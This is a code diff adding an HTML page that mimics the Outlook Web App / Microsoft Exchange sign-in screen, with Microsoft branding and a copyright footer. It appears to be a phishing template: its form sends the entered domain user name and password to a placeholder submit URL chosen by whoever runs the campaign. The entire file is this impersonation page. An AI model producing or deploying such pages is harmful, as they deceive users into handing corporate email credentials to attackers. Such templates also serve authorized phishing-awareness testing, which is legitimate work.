@@ -1,0 +1,52 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Outlook Web App</title>
+<style>
+  *{box-sizing:border-box}
+  body{margin:0;font-family:"Segoe UI",-apple-system,Roboto,Helvetica,Arial,sans-serif;color:#000;background:#eaeaea}
+  .bar{height:4px;background:#0072c6}
+  .wrap{display:flex;justify-content:center;padding:70px 20px}
+  .card{width:440px;max-width:100%}
+  .brand{font-size:13px;color:#666;margin:0 0 4px}
+  h1{font-size:26px;font-weight:600;color:#0072c6;margin:0 0 26px}
+  label{display:block;font-size:13px;margin:14px 0 4px;color:#333}
+  input[type=text],input[type=password]{width:100%;height:30px;border:1px solid #ababab;
+    padding:4px 6px;font-size:14px;border-radius:0;outline:none;background:#fff}
+  input:focus{border-color:#0072c6}
+  fieldset{border:none;margin:18px 0 6px;padding:0}
+  .opt{display:flex;align-items:flex-start;gap:8px;font-size:13px;color:#333;margin:7px 0}
+  .opt input{margin-top:2px}
+  button{margin-top:20px;height:32px;padding:0 26px;border:none;border-radius:0;background:#0072c6;color:#fff;font-size:14px;font-family:inherit;cursor:pointer}
+  button:hover{background:#0063ad}
+  .conn{font-size:12px;color:#666;margin-top:22px;border-top:1px solid #d6d6d6;padding-top:12px}
+  .foot{text-align:center;font-size:12px;color:#8a8a8a;padding:26px}
+</style>
+</head>
+<body>
+  <div class="bar"></div>
+  <div class="wrap">
+    <form class="card" method="post" action="{{.SubmitURL}}" autocomplete="off">
+      <p class="brand">Outlook<sup>&reg;</sup> Web App</p>
+      <h1>Outlook Web App</h1>
+
+      <fieldset>
+        <div class="opt"><input type="radio" name="sec" id="pub"><label for="pub" style="margin:0">This is a public or shared computer</label></div>
+        <div class="opt"><input type="radio" name="sec" id="pri" checked><label for="pri" style="margin:0">This is a private computer</label></div>
+      </fieldset>
+
+      <label for="u">Domain\user name:</label>
+      <input id="u" name="username" type="text">
+      <label for="p">Password:</label>
+      <input id="p" name="password" type="password">
+
+      <button type="submit">sign in</button>
+
+      <p class="conn">Connected to Microsoft Exchange</p>
+    </form>
+  </div>
+  <div class="foot">&copy; Microsoft Corporation. All rights reserved.</div>
+</body>
+</html>
